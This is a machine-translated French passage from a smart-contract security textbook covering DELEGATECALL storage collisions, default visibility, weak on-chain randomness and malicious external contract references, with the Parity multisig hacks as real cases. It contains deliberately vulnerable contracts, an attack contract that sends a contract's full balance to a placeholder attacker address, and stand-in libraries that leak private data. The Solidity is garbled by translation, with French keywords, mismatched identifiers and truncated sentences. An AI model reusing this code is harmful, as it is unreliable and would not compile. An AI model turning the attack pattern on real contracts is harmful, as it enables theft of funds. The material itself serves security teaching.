uint soldeactuel = dépôtWei + msg. valeur ;

// s'assure qu'il n'y a plus de joueurs après la fin du jeu

require( currentBalance <= finalMileStone );

si ( soldeactuel == payoutMileStone1) \{

échangeableEther [ msg.sender ] += mileStone1Reward ;

}

sinon si ( soldeactuel == payoutMileStone2) \{

échangeableEther [ msg.sender ] += mileStone2Reward ;

}

sinon si ( balanceactuelle == pierreMilefinale ) \{

rachetableEther [ msg.sender ] += finalReward ;

}

déposéWei += msg. valeur ;

retourner;

}

fonction réclamationrécompense ( ) public \{

// s'assure que le jeu est terminé

nécessite( deposeWei == finalMileStone );

// s'assure qu'il y a une récompense à donner

require ( redevableEther [ msg.sender ] > 0);

rachetableEther [ msg.expéditeur ] = 0 ;

msg.sender .transfer ( transferValue );

}

}

Ici, nous avons créé une nouvelle variable, déposéWei , qui garde la trace de l'éther connu déposé, et c'est cette variable que nous utilisons pour nos tests. Notez que nous n'avons plus aucune référence à this.balance .

Autres exemples

Quelques exemples de contrats exploitables ont été donnés dans le https://github.com/Arachnid/uscc/tree/master/submissions-2017/[+++Underhanded Solidity Coding Contest+++] , qui fournit également des exemples détaillés d'un certain nombre de pièges soulevés dans cette section.

APPEL DÉLÉGUÉ

Les opcodes CALL et DELEGATECALL sont utiles pour permettre aux développeurs Ethereum de modulariser leur code. Les appels de messages externes standard aux contrats sont gérés par l' opcode CALL , le code étant exécuté dans le contexte du contrat/de la fonction externe. L' opcode DELEGATECALL est presque identique, sauf que le code exécuté à l'adresse ciblée est exécuté dans le contexte du contrat appelant, et msg.sender et msg.value restent inchangés. Cette fonctionnalité permet la mise en œuvre de _bibliothèques_ , permettant aux développeurs de déployer du code réutilisable une seule fois et de l'appeler à partir de futurs contrats.

Bien que les différences entre ces deux opcodes soient simples et intuitives, l'utilisation de DELEGATECALL peut conduire à l'exécution de code inattendu.

Pour plus de lecture, voir Loi.Luu's http://bit.ly/2AAElb8[+++Question Ethereum Stack Exchange sur ce sujet+++] et la http://bit.ly/2Oi7UlH[+++documentation Solidity+++] .

La vulnérabilité

En raison de la nature de préservation du contexte de DELEGATECALL , la création de bibliothèques personnalisées sans vulnérabilité n'est pas aussi simple qu'on pourrait le penser. Le code des bibliothèques elles-mêmes peut être sécurisé et sans vulnérabilité ; cependant, lorsqu'il est exécuté dans le contexte d'une autre application, de nouvelles vulnérabilités peuvent survenir. Voyons un exemple assez complexe de cela, en utilisant des nombres de Fibonacci.

Considérez la bibliothèque dans file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#fibonacci_security[+++FibonacciLib.sol+++] , qui peut générer la séquence de Fibonacci et des séquences de forme similaire. (Remarque : ce code a été modifié à partir de https://bit.ly/2MReuii[+++https://bit.ly/2MReuii+++] .)

_Exemple 6. FibonacciLib.sol_

// contrat de bibliothèque - calcule les nombres de type Fibonacci

contrat FibonacciLib \{

// initialisation de la suite standard de Fibonacci

uint démarrage public ;

uint publiccalculéFibNumber ; _

// modifie le numéro zéro de la séquence

fonction setStart ( uint _start) public \{

début = _ début ;

}

function setFibonacci ( uint n) public \{

nombreFibcalculé = fibonacci (n );

}

fonction fibonacci ( uint n) retours internes ( uint ) \{

si (n == 0) retour début ;

sinon si (n == 1) retour début + 1 ;

sinon retourner fibonacci ( n - 1) + fibonacci (n - 2);

}

}

Cette bibliothèque fournit une fonction qui peut générer le _n_ - ème nombre de Fibonacci dans la séquence. Il permet aux utilisateurs de changer le numéro de départ de la séquence ( start ) et de calculer les _n_ - ièmes nombres de type Fibonacci dans cette nouvelle séquence.

Considérons maintenant un contrat qui utilise cette bibliothèque, montré dans file:///\\\\wsl.localhost\\Ubuntu-20.04\\home\\syr3fx\\Code\\github\\maitriser-ca\\LivreMaitriserEthereum\\adoc\\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#fib_balance_security[+++FibonacciBalance.sol+++] .

_Exemple 7. FibonacciBalance.sol_

contrat FibonacciBalance \{

adresse publique fibonacciLibrary ;

// le nombre de Fibonacci actuel à retirer

uint publiccalculéFibNumber ; _

// le numéro de séquence de Fibonacci de départ

uint public start = 3;

Compteur de retrait public uint ;

// le sélecteur de fonction de Fibonancci

bytes4 constante fibSig = bytes4(sha3(" setFibonacci (uint256)") );

// constructeur - charge le contrat avec ether

constructeur ( adresse _ fibonacciLibrary ) external payable \{

fibonacciLibrary = _fibonacciLibrary ;

}

fonction retirer( ) \{

retraitCompteur += 1 ;

// calcule le nombre de Fibonacci pour l'utilisateur de retrait actuel-

// ceci définit le nombreFibcalculé

require( fibonacciLibrary.delegatecall ( fibSig , removalCounter ));

msg.sender .transfer ( calculéFibNumber * 1 ether);

}

// permet aux utilisateurs d'appeler les fonctions de la bibliothèque Fibonacci

fonction( ) public \{

require( fibonacciLibrary.delegatecall ( msg.data ));

}

}

Ce contrat permet à un participant de retirer des ethers du contrat, la quantité d'ethers étant égale au nombre de Fibonacci correspondant à l'ordre de retrait du participant ; c'est-à-dire que le premier participant obtient 1 éther, le second obtient également 1, le troisième obtient 2, le quatrième obtient 3, le cinquième 5, et ainsi de suite (jusqu'à ce que le solde du contrat soit inférieur au nombre de Fibonacci retiré).

Il y a un certain nombre d' éléments dans ce contrat qui peuvent nécessiter quelques explications. Tout d'abord, il existe une variable intéressante, fibSig . Cela contient les 4 premiers octets du hachage Keccak-256 (SHA-3) de la chaîne ' setFibonacci (uint256)' . Ceci est connu sous le nom de http://bit.ly/2RmueMP[+++sélecteur de fonction+++] et est placé dans calldata pour spécifier quelle fonction d'un contrat intelligent sera appelée. Il est utilisé dans la fonction d'appel délégué à la ligne 21 pour spécifier que nous souhaitons exécuter la fonction fibonacci (uint256) . Le deuxième argument de l' appel délégué est le paramètre que nous passons à la fonction. Deuxièmement, nous supposons que l'adresse de la bibliothèque FibonacciLib est correctement référencée dans le constructeur ( file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#external_contract_referencing[+++External Contract Referencing+++] traite de certaines vulnérabilités potentielles liées à ce type d'initialisation de référence de contrat).

Pouvez-vous repérer des erreurs dans ce contrat ? Si l'on déployait ce contrat, le remplissait d'éther et appelait retire , il reviendrait probablement.

Vous avez peut-être remarqué que la variable d'état start est utilisée à la fois dans la bibliothèque et dans le contrat d'appel principal. Dans le contrat de bibliothèque, start est utilisé pour spécifier le début de la séquence de Fibonacci et est défini sur 0 , alors qu'il est défini sur 3 dans le contrat appelant. Vous avez peut-être également remarqué que la fonction de secours dans le contrat FibonacciBalance permet de transmettre tous les appels au contrat de bibliothèque, ce qui permet d'appeler la fonction setStart du contrat de bibliothèque. En rappelant que nous préservons l'état du contrat, il peut sembler que cette fonction permettrait de changer l'état de la variable start dans le contrat local FibonnacciBalance . Si c'est le cas, cela permettrait de retirer plus d'éther, car le calculéFibNumber résultant dépend de la variable de départ (comme indiqué dans le contrat de bibliothèque). En réalité , la fonction setStart ne modifie pas (et ne peut pas) modifier la variable start dans le contrat FibonacciBalance . La vulnérabilité sous-jacente de ce contrat est bien pire que la simple modification de la variable de départ .

Avant de discuter du problème réel, faisons un petit détour pour comprendre comment les variables d'état sont réellement stockées dans les contrats. Les variables d'état ou de stockage (variables qui persistent sur des transactions individuelles) sont placées dans des _emplacements_ de manière séquentielle au fur et à mesure qu'elles sont introduites dans le contrat. (Il y a quelques complexités ici ; consultez la documentation de http://bit.ly/2JslDWf[+++Solidity+++] pour une compréhension plus approfondie.)

Prenons l'exemple du contrat de bibliothèque. Il a deux variables d'état, start et calculateFibNumber . La première variable, start , est stockée dans le stockage du contrat à slot[ 0] (c'est-à-dire le premier slot). La deuxième variable, calculateFibNumber , est placée dans le prochain emplacement de stockage disponible, slot[ 1] . La fonction setStart prend une entrée et définit start quelle que soit l'entrée. Cette fonction définit donc slot[ 0] sur l'entrée que nous fournissons dans la fonction setStart . De la même manière, la fonction setFibonacci définit la fonction calculatorFibNumber sur le résultat de fibonacci (n) . Encore une fois, il s'agit simplement de définir storage slot[ 1] sur la valeur de fibonacci (n) .

Regardons maintenant le contrat FibonacciBalance . Storage slot[ 0] correspond maintenant à l' adresse fibonacciLibrary , et slot[1] correspond à calculatorFibNumber . C'est dans ce mappage incorrect que la vulnérabilité se produit. appel délégué _préserve le contexte du contrat_ . Cela signifie que le code exécuté via l'appel délégué agira sur l'état (c'est-à-dire le stockage) du contrat appelant.

Notez maintenant qu'en retrait à la ligne 21, nous exécutons fibonacciLibrary.delegatecall ( fibSig,withdrawalCounter ) . Cela appelle la fonction setFibonacci , qui, comme nous l'avons vu, modifie le slot de stockage[ 1] , qui dans notre contexte actuel est calculateFibNumber . C'est comme prévu (c'est-à-dire qu'après l'exécution, le nombreFibcalculé est modifié). Cependant, rappelez-vous que la variable de début dans le contrat FibonacciLib est située dans le slot de stockage [ 0] , qui est l' adresse fibonacciLibrary dans le contrat actuel. Cela signifie que la fonction fibonacci donnera un résultat inattendu. En effet, il fait référence à start ( slot[ 0] ), qui dans le contexte d'appel actuel est l' adresse fibonacciLibrary (qui sera souvent assez grande, lorsqu'elle est interprétée comme un uint ). Ainsi , il est probable que la fonction de retrait reviendra, car elle ne contiendra pas la quantité uint ( fibonacciLibrary ) d'éther, ce qui est ce que calculateFibNumber renverra.

Pire encore, le contrat FibonacciBalance permet aux utilisateurs d'appeler toutes les fonctions fibonacciLibrary via la fonction de secours à la ligne 26. Comme nous l'avons vu précédemment, cela inclut la fonction setStart . Nous avons expliqué que cette fonction permet à quiconque de modifier ou de définir l' emplacement de stockage [ 0] . Dans ce cas, emplacement de stockage [ 0] est l' adresse fibonacciLibrary . Par conséquent, un attaquant pourrait créer un contrat malveillant, convertir l'adresse en uint (cela peut être fait facilement en Python en utilisant int('<address>',16) ), puis appeler setStart (< attack_contract_address_as_uint >) . Cela changera fibonacciLibrary à l'adresse du contrat d'attaque. Ensuite, chaque fois qu'un utilisateur appelle remove ou la fonction de secours, le contrat malveillant s'exécutera (ce qui peut voler la totalité du solde du contrat) car nous avons modifié l'adresse réelle de fibonacciLibrary . Un exemple d'un tel contrat d'attaque serait :

contrat Attaque \{

uint storageSlot0 ; // correspond à fibonacciLibrary

uint emplacement de stockage1 ; // correspond au nombreFibcalculé

// fallback - cela s'exécutera si une fonction spécifiée n'est pas trouvée

fonction( ) public \{

emplacement de stockage1 = 0 ; // nous avons défini la valeur calculéeFibNumber à 0, donc si retirer

// s'appelle nous n'envoyons pas d'éther

< adresse_attaquant >.transfer ( this.balance ) ; // on prend tout l'éther

}

}

Notez que ce contrat d'attaque modifie le calculatorFibNumber en changeant le slot de stockage [ 1] . En principe, un attaquant pourrait modifier n'importe quel autre emplacement de stockage de son choix, pour effectuer toutes sortes d'attaques sur ce contrat. Nous vous encourageons à mettre ces contrats dans https://remix.ethereum.org[+++Remix+++] et à expérimenter différents contrats d'attaque et changements d'état via ces fonctions d' appel délégué .

Il est également important de noter que lorsque nous disons que l' appel délégué préserve l'état, nous ne parlons pas des noms de variables du contrat, mais plutôt des emplacements de stockage réels vers lesquels ces noms pointent. Comme vous pouvez le voir dans cet exemple, une simple erreur peut conduire un attaquant à détourner l'intégralité du contrat et de son éther.

Techniques préventives

Solidity fournit le mot-clé de bibliothèque pour la mise en œuvre des contrats de bibliothèque (voir la http://bit.ly/2zjD8TI[+++documentation+++] pour plus de détails). Cela garantit que le contrat de bibliothèque est sans état et non autodestructible . Forcer les bibliothèques à être sans état atténue les complexités du contexte de stockage démontrées dans cette section. Les bibliothèques sans état empêchent également les attaques dans lesquelles les attaquants modifient directement l'état de la bibliothèque afin d' affecter les contrats qui dépendent du code de la bibliothèque. En règle générale, lorsque vous utilisez DELEGATECALL , faites très attention au contexte d'appel possible du contrat de bibliothèque et du contrat d'appel, et chaque fois que possible, créez des bibliothèques sans état.

Exemple concret : Parity Multisig Wallet (Second Hack)

Le hack Second Parity Multisig Wallet est un exemple de la façon dont un code de bibliothèque bien écrit peut être exploité s'il est exécuté en dehors de son contexte prévu. Il existe un certain nombre de bonnes explications de ce hack, telles que http://bit.ly/2Dg7GtW[+++"Parity+++ +++Multisig+++ +++Hacked. Encore une fois »+++] et http://bit.ly/2Of06B9[+++« Un examen approfondi du+++ +++bogue+++ +++multisig de parité »+++] .

Pour compléter ces références, explorons les contrats qui ont été exploités. Les contrats de bibliothèque et de portefeuille peuvent être trouvés http://bit.ly/2OgnXQC[+++sur GitHub+++] .

Le contrat de bibliothèque est le suivant :

contrat WalletLibrary est WalletEvents \{

...

// lancer sauf si le contrat n'est pas encore initialisé.

modificateur uniquement_non initialisé \{ if ( m_numOwners > 0) lancer ; _; }

// constructeur - il suffit de transmettre le tableau propriétaire à multipropriété et

// la limite à daylimit

fonction initWallet ( adresse[ ] _owners, uint _required, uint _ daylimit )

only_uninitialized \{

initDaylimit (_ daylimit );

initMultiowned ( _owners, _required);

}

// tue le contrat en envoyant tout à `_to`.

fonction kill( adresse _to) onlymanyowners (sha3( msg.data )) external \{

suicidé(_to );

}

...

}

Et voici le contrat de portefeuille :

contrat Wallet est WalletEvents \{

...

// MÉTHODES

// est appelé lorsqu'aucune autre fonction ne correspond

fonction( ) payable \{

// juste recevoir de l' argent ?

si ( msg.value > 0)

Dépôt( msg.sender , msg.value );

sinon si ( msg. data.length > 0)

_ walletLibrary.delegatecall ( msg.data );

}

...

// DES CHAMPS

adresse constante _ walletLibrary =

0xcafécafécafécafécaféfécafécafécafé;

}

Notez que le contrat Wallet transmet essentiellement tous les appels au contrat WalletLibrary via un appel délégué. L'adresse constante _ walletLibrary dans cet extrait de code agit comme un espace réservé pour le déploiement réel Contrat WalletLibrary (qui était à 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4 ).

portefeuille déployable à faible coût dont la base de code et les principales fonctionnalités se trouvaient dans le contrat WalletLibrary . Malheureusement, le contrat WalletLibrary est lui-même un contrat et conserve son propre état. Pouvez-vous voir pourquoi cela pourrait être un problème?

Il est possible d'envoyer des appels au contrat WalletLibrary lui-même. Plus précisément, le contrat WalletLibrary pourrait être initialisé et devenir propriétaire. En fait, un utilisateur a fait cela, appelant la fonction initWallet sur le contrat WalletLibrary et devenant propriétaire du contrat de bibliothèque. Le même utilisateur a ensuite appelé la fonction kill . Étant donné que l'utilisateur était propriétaire du contrat de bibliothèque, le modificateur a été adopté et le contrat de bibliothèque s'est auto-détruit. Comme tous les contrats Wallet existants se réfèrent à ce contrat de bibliothèque et ne contiennent aucune méthode pour modifier cette référence, toutes leurs fonctionnalités, y compris la possibilité de retirer de l'éther, ont été perdues avec le contrat WalletLibrary . En conséquence, tout l'éther de tous les portefeuilles multisig Parity de ce type a été instantanément perdu ou définitivement irrécupérable.

Visibilités par défaut

Les fonctions dans Solidity ont des spécificateurs de visibilité qui dictent comment elles peuvent être appelées. La visibilité détermine si une fonction peut être appelée en externe par les utilisateurs, par d'autres contrats dérivés, uniquement en interne ou uniquement en externe. Il existe quatre spécificateurs de visibilité, qui sont décrits en détail dans la http://bit.ly/2ABiv7j[+++documentation Solidity+++] . Les fonctions sont par défaut à public , permettant aux utilisateurs de les appeler de l'extérieur. Nous allons maintenant voir comment une utilisation incorrecte des spécificateurs de visibilité peut entraîner des vulnérabilités dévastatrices dans les contrats intelligents.

La vulnérabilité

La visibilité par défaut des fonctions est public , donc les fonctions qui ne spécifient pas leur visibilité pourront être appelées par des utilisateurs externes. Le problème survient lorsque les développeurs omettent par erreur les spécificateurs de visibilité sur les fonctions qui devraient être privées (ou uniquement appelables dans le contrat lui-même).

Explorons rapidement un exemple trivial :

contrat HashForEther \{

fonction retirerGains ( ) \{

// Gagnant si les 8 derniers caractères hexadécimaux de l'adresse sont 0

require(uint32( msg.sender ) == 0);

_ envoyerGains ( );

}

function _ envoyerGains ( ) \{

msg.sender .transfer ( this.balance );

}

}

Ce contrat simple est conçu pour agir comme un jeu de prime de devinette d'adresse. Pour remporter le solde du contrat, un utilisateur doit générer une adresse Ethereum dont les 8 derniers caractères hexadécimaux sont 0. Une fois atteint, il peut appeler la fonction removeWinnings pour obtenir sa prime.

Malheureusement, la visibilité des fonctions n'a pas été précisée. En particulier, la fonction _ sendWinnings est publique (par défaut), et donc n'importe quelle adresse peut appeler cette fonction pour voler la prime.

Techniques préventives

Il est de bonne pratique de toujours spécifier la visibilité de toutes les fonctions dans un contrat, même si elles sont intentionnellement publiques . Les versions récentes de solc affichent un avertissement pour les fonctions qui n'ont pas de visibilité explicite définie, pour encourager cette pratique.

Exemple concret : portefeuille multisig à parité (premier hack)

multisig de Parity , environ 31 millions de dollars d'Ether ont été volés, principalement dans trois portefeuilles. Un bon récapitulatif de la façon exacte dont cela a été fait est donné par https://bit.ly/2vHiuJQ[+++Haseeb Qureshi+++] .

Essentiellement, le portefeuille multisig est construit à partir d'un contrat Wallet de base , qui appelle un contrat de bibliothèque contenant la fonctionnalité de base (comme décrit dans file:///\\\\wsl.localhost\\Ubuntu-20.04\\home\\syr3fx\\Code\\github\\maitriser-ca\\LivreMaitriserEthereum\\adoc\\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#multisig_secondhack[+++Real-World Example: Parity+++] file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#multisig_secondhack[+++Multisig+++ +++Wallet (Second Hack)+++] ). Le contrat de bibliothèque contient le code pour initialiser le portefeuille, comme le montre l'extrait suivant :

contrat WalletLibrary est WalletEvents \{

...

// MÉTHODES

...

// le constructeur reçoit le nombre de sigs requis pour faire protected

// Transactions " onlymanyowners " ainsi que la sélection des adresses

// capable de les confirmer

function initMultiowned ( adresse[ ] _owners, uint _required) \{

m_numOwners = _owners.length + 1 ;

m_ propriétaires [ 1] = uint ( msg.sender );

m_ownerIndex [ uint ( msg.sender )] = 1;

pour ( uint je = 0 ; je < _ propriétaires.longueur ; ++ je )

\{

m_propriétaires [ 2 + i ] = uint ( _owners [ i ]);

m_ownerIndex [ uint (_owners[ je ])] = 2 + je ;

}

m_required = _ requis ;

}

...

// constructeur - il suffit de transmettre le tableau propriétaire à multipropriété et

// la limite à daylimit

function initWallet ( adresse[ ] _owners, uint _required, uint _ daylimit ) \{

initDaylimit (_ daylimit );

initMultiowned ( _owners, _required);

}

}

Notez qu'aucune des fonctions ne spécifie leur visibilité, donc les deux sont par défaut public . La fonction initWallet est appelée dans le constructeur du portefeuille et définit les propriétaires du portefeuille multisig comme on peut le voir dans la fonction initMultiowned . Étant donné que ces fonctions ont été accidentellement laissées publiques , un attaquant a pu appeler ces fonctions sur des contrats déployés, réinitialisant la propriété à l'adresse de l'attaquant. En tant que propriétaire, l'attaquant a ensuite vidé les portefeuilles de tout leur éther.

Illusion d'entropie

Toutes les transactions sur la blockchain Ethereum sont des opérations de transition d'état déterministes. Cela signifie que chaque transaction modifie l'état global de l' écosystème Ethereum de manière calculable, sans incertitude. Cela a pour implication fondamentale qu'il n'y a pas de source d'entropie ou d'aléatoire dans Ethereum. Atteindre une entropie décentralisée (aléatoire) est un problème bien connu pour lequel de nombreuses solutions ont été proposées, y compris +++RANDAO+++ , ou en utilisant une chaîne de hachages, comme décrit par Vitalik Buterin dans le billet de blog https://vitalik.ca/files/randomness.html[+++« Validator Ordering and Randomness in+++ +++PoS+++ +++»+++] .

La vulnérabilité

Certains des premiers contrats construits sur la plate-forme Ethereum étaient basés sur le jeu. Fondamentalement, le jeu nécessite de l'incertitude (quelque chose sur lequel parier), ce qui rend la construction d'un système de jeu sur la blockchain (un système déterministe) plutôt difficile. Il est clair que l' incertitude doit provenir d'une source extérieure à la blockchain. C'est possible pour les paris entre joueurs (voir par exemple la http://bit.ly/2CUh2KS[+++technique commit–reveal+++] ) ; cependant, c'est beaucoup plus difficile si vous voulez mettre en place un contrat pour agir en tant que "maison" (comme au blackjack ou à la roulette). Un écueil courant consiste à utiliser des variables de bloc futures, c'est-à-dire des variables contenant des informations sur le bloc de transaction dont les valeurs ne sont pas encore connues, telles que des hachages, des horodatages, des numéros de bloc ou des limites de gaz. Le problème avec ceux-ci est qu'ils sont contrôlés par le mineur qui exploite le bloc et, en tant que tels, ne sont pas vraiment aléatoires. Considérez, par exemple, un contrat intelligent de roulette avec une logique qui renvoie un nombre noir si le hachage du bloc suivant se termine par un nombre pair. Un mineur (ou pool de mineurs) pourrait parier 1 million de dollars sur le noir. S'ils résolvent le bloc suivant et trouvent que le hachage se termine par un nombre impair, ils pourraient heureusement ne pas publier leur bloc et en exploiter un autre, jusqu'à ce qu'ils trouvent une solution avec le hachage du bloc étant un nombre pair (en supposant que la récompense du bloc et les frais sont inférieurs à 1 M$). L'utilisation de variables passées ou présentes peut être encore plus dévastatrice, comme le démontre Martin Swende dans son excellent http://martin.swende.se/blog/Breaking_the_house.html[+++article de blog+++] . De plus, utiliser uniquement des variables de bloc signifie que le nombre pseudo-aléatoire sera le même pour toutes les transactions d'un bloc, de sorte qu'un attaquant peut multiplier ses gains en effectuant de nombreuses transactions dans un bloc (devrait-il y avoir une mise maximale).

Techniques préventives

La source d'entropie (aléatoire) doit être externe à la blockchain. Cela peut être fait entre pairs avec des systèmes tels que http://bit.ly/2CUh2KS[+++commit–reveal+++] , ou en changeant le modèle de confiance en un groupe de participants (comme dans https://github.com/randao/randao[+++RandDAO+++] ). Cela peut également être fait via une entité centralisée qui agit comme un oracle aléatoire. Les variables de bloc (en général, il y a quelques exceptions) ne doivent pas être utilisées pour générer de l'entropie, car elles peuvent être manipulées par les mineurs.

Exemple concret : contrats PRNG

En février 2018 Arsène Reoutov http://bit.ly/2Q589lx[+++a blogué+++] sur son analyse de 3 649 contrats intelligents en direct qui utilisaient une sorte de générateur de nombres pseudo-aléatoires (PRNG) ; il a trouvé 43 contrats qui pourraient être exploités.

Référencement des contrats externes

L'un des avantages de l'"ordinateur mondial" Ethereum est la possibilité de réutiliser du code et d'interagir avec des contrats déjà déployés sur le réseau. En conséquence, un grand nombre de contrats font référence à des contrats externes, généralement via des appels de messages externes. Ces appels de messages externes peuvent masquer les intentions des acteurs malveillants de certaines manières non évidentes, que nous allons maintenant examiner.

La vulnérabilité

Dans Solidity, n'importe quelle adresse peut être convertie en contrat, que le code à l'adresse représente ou non le type de contrat en cours de conversion. Cela peut causer des problèmes, en particulier lorsque l'auteur du contrat tente de dissimuler un code malveillant. Illustrons cela par un exemple.

Considérez un morceau de code comme file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#rot13_security[+++Rot13Encryption.sol+++] , qui implémente rudimentairement le https://en.wikipedia.org/wiki/ROT13[+++chiffrement ROT13+++] .

_Exemple 8. Rot13Encryption.sol_

// contrat de chiffrement

contrat Rot13Encryption \{

événement ( chaîne convertieString );

// rot13-chiffre une chaîne

fonction rot13Encrypt (texte de chaîne) public \{

uint256 longueur = octets(texte ).longueur ;

pour (var je = 0; je < longueur; je ++) \{

octet char = octets(texte)[ i ] ;

// assemblage en ligne pour modifier la chaîne

Assemblée \{

// récupère le premier octet

car : = octet(0,car)

// si le caractère est dans [ n,z ], c'est-à-dire enveloppant

si et( gt (car,0x6D), lt (car,0x7B))

// soustraire du nombre ASCII 'a',

// la différence entre le caractère <char> et 'z'

\{ car := sub(0x60, sub(0x7A,char)) }

if iszero ( eq(char, 0x20)) // ignore les espaces

// ajoute 13 au caractère

\{mstore8(add(add(text,0x20), mul (i,1)), add(char,13))}

}

}

émettre Résultat (texte );

}

// rot13-déchiffre une chaîne

fonction rot13Decrypt (texte de chaîne) public \{

uint256 longueur = octets(texte ).longueur ;

pour (var je = 0; je < longueur; je ++) \{

octet char = octets(texte)[ i ] ;

Assemblée \{

car : = octet(0,car)

si et( gt (car,0x60), lt (car,0x6E))

\{ char := ajouter(0x7B, sous(char,0x61)) }

si vaut zéro ( eq(char, 0x20))

\{mstore8(add(add(text,0x20), mul (i,1)), sub(char,13))}

}

}

émettre Résultat (texte );

}

}

Ce code prend simplement une chaîne (lettres a–z, sans validation) et la _crypte_ en décalant chaque caractère de 13 positions vers la droite (en s'enroulant autour de z ) ; c'est-à-dire un passe à n et x passe à k . L'assemblage dans le contrat précédent n'a pas besoin d'être compris pour apprécier le problème discuté, de sorte que les lecteurs non familiarisés avec l'assemblage peuvent l'ignorer en toute sécurité.

Considérons maintenant le contrat suivant, qui utilise ce code pour son chiffrement :

importer "Rot13Encryption.sol " ;

// crypte vos informations top-secrètes

contract EncryptionContrat \{

// bibliothèque pour le chiffrement

de chiffrement Rot13Encryption ;

// constructeur - initialise la bibliothèque

constructeur ( Rot13Encryption _ bibliothèque de chiffrement ) \{

bibliothèquecryptage = _ bibliothèquecryptage ;

}

function encryptPrivateData ( string privateInfo ) \{

// faire potentiellement quelques opérations ici

cryptageLibrary.rot13Encrypt( privateInfo );

}

}

Le problème avec ce contrat est que l' adresse de la bibliothèque de chiffrement n'est pas publique ou constante. Ainsi, le déployeur du contrat pourrait donner une adresse dans le constructeur qui pointe vers ce contrat :

// contrat de chiffrement

contrat Rot26Encryption \{

événement ( chaîne convertieString );

// rot13-chiffre une chaîne

fonction rot13Encrypt (texte de chaîne) public \{

uint256 longueur = octets(texte ).longueur ;

pour (var je = 0; je < longueur; je ++) \{

octet char = octets(texte)[ i ] ;

// assemblage en ligne pour modifier la chaîne

Assemblée \{

// récupère le premier octet

car : = octet(0,car)

// si le caractère est dans [ n,z ], c'est-à-dire enveloppant

si et( gt (car,0x6D), lt (car,0x7B))

// soustraire du nombre ASCII 'a',

// la différence entre le caractère <char> et 'z'

\{ car := sub(0x60, sub(0x7A,char)) }

// ignore les espaces

si vaut zéro ( eq(char, 0x20))

// ajoute 26 au caractère !

\{mstore8(add(add(text,0x20), mul (i,1)), add(char,26))}

}

}

émettre Résultat (texte );

}

// rot13-déchiffre une chaîne

fonction rot13Decrypt (texte de chaîne) public \{

uint256 longueur = octets(texte ).longueur ;

pour (var je = 0; je < longueur; je ++) \{

octet char = octets(texte)[ i ] ;

Assemblée \{

car : = octet(0,car)

si et( gt (car,0x60), lt (car,0x6E))

\{ char := ajouter(0x7B, sous(char,0x61)) }

si vaut zéro ( eq(char, 0x20))

\{mstore8(add(add(text,0x20), mul (i,1)), sub(char,26))}

}

}

émettre Résultat (texte );

}

}

Ce contrat implémente le chiffrement ROT26, qui décale chaque caractère de 26 places (c'est-à-dire, ne fait rien). Encore une fois, il n'est pas nécessaire de comprendre l'assemblage dans ce contrat. Plus simplement, l'attaquant aurait pu lier le contrat suivant au même effet :

contrat Imprimer\{

event Print( string text);

function rot13 Encrypt( string text) public \{

émettre Print(text );

}

}

Si l'adresse de l'un de ces contrats était donnée dans le constructeur, la fonction encryptPrivateData produirait simplement un événement qui imprime les données privées non chiffrées.

Bien que dans cet exemple, un contrat de type bibliothèque ait été défini dans le constructeur, il arrive souvent qu'un utilisateur privilégié (tel qu'un propriétaire) puisse modifier les adresses de contrat de bibliothèque. Si un contrat lié ne contient pas la fonction appelée, la fonction de secours s'exécutera. Par exemple, avec la ligne encryptionLibrary.rot13 ​Encrypt ( ) , si le contrat spécifié par encryptionLibrary était :

contrat Vide \{

event Print( string text);

une fonction () \{

émettre Print("Ici" );

// placez le code malveillant ici et il s'exécutera

}

}

alors un événement avec le texte Ici serait émis. Ainsi, si les utilisateurs peuvent modifier les bibliothèques de contrats, ils peuvent en principe amener d'autres utilisateurs à exécuter du code arbitraire sans le savoir.

[width="100%",cols="16%,84%",options="header",]
|===
|*AVERTISSEMENT* |Les contrats représentés ici sont uniquement à des fins de démonstration et ne représentent pas un cryptage approprié. Ils ne devrait pas être utilisé pour le cryptage .
|===

Techniques préventives

Comme démontré précédemment, les contrats sûrs peuvent (dans certains cas) être déployés de telle manière qu'ils se comportent de manière malveillante. Un auditeur pourrait vérifier publiquement un contrat et demander à son propriétaire de le déployer de manière malveillante, ce qui entraînerait un contrat audité publiquement présentant des vulnérabilités ou une intention malveillante.

Il existe un certain nombre de techniques qui empêchent ces scénarios.

Une technique consiste à utiliser le nouveau mot-clé pour créer des contrats. Dans l'exemple précédent, le constructeur pourrait s'écrire :

constructeur( ) \{

encryptionLibrary = new Rot13 Encryption( );

}

cette façon, une instance du contrat référencé est créée au moment du déploiement et le déployeur ne peut pas remplacer le contrat Rot13Encryption sans le modifier.

Une autre solution consiste à coder en dur les adresses de contrat externes.

En général, le code qui appelle des contrats externes doit toujours être audité avec soin. En tant que développeur, lors de la définition de contrats externes, il peut être judicieux de rendre publiques les adresses des contrats (ce qui n'est pas le cas dans l'exemple du pot de miel de la section suivante) pour permettre aux utilisateurs d'examiner facilement le code référencé par le contrat. Inversement, si un contrat a une adresse de contrat variable privée, cela peut être le signe d'un comportement malveillant (comme le montre l'exemple du monde réel). Si un utilisateur peut modifier une adresse de contrat utilisée pour appeler des fonctions externes, il peut être important (dans un contexte de système décentralisé) d'implémenter un mécanisme de verrouillage du temps et/ou de vote pour permettre aux utilisateurs de voir quel code est modifié, ou pour donner aux participants la possibilité de s'inscrire/de s'abstenir avec la nouvelle adresse contractuelle.

Exemple concret : pot de miel de réentrance

Un certain nombre de pots de miel récents ont été publiés sur le réseau principal . Ces contrats tentent de déjouer les pirates Ethereum qui tentent d'exploiter les contrats, mais qui finissent par perdre de l'éther au profit du contrat qu'ils s'attendent à exploiter. Un exemple utilise cette attaque en remplaçant un contrat attendu par un contrat malveillant dans le constructeur. Le code se trouve http://bit.ly/2JtdqRi[+++ici+++] :

pragma solidité ^0.4. 19;

